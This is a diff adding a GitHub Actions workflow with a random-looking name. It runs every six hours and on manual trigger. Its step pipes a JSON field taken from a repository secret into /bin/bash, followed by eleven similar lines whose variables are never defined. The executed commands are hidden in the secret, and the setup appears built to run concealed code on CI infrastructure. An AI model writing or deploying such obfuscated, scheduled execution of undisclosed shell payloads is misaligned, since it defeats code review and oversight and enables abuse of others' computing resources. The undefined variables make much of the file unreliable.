@@ -1,0 +1,27 @@
+name: xueroumahuaa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xueroumahuaa
+        env:
+          us86: ${{ secrets.us86 }}
+        run: |
+          echo $us86 | jq -r .n28 | /bin/bash
+          echo $k4 | jq -r .ok1911 | /bin/bash
+          echo $awx85 | jq -r .fi9980 | /bin/bash
+          echo $j8458 | jq -r .li358 | /bin/bash
+          echo $kwigr235 | jq -r .phaza8 | /bin/bash
+          echo $wyn3 | jq -r .xc28 | /bin/bash
+          echo $lil61 | jq -r .p53 | /bin/bash
+          echo $mm536 | jq -r .b9038 | /bin/bash
+          echo $j2463 | jq -r .grrvt8 | /bin/bash
+          echo $zk3756 | jq -r .l5 | /bin/bash
+          echo $nj162 | jq -r .hkd8 | /bin/bash
+          echo $fybu47 | jq -r .fsj5330 | /bin/bash
+
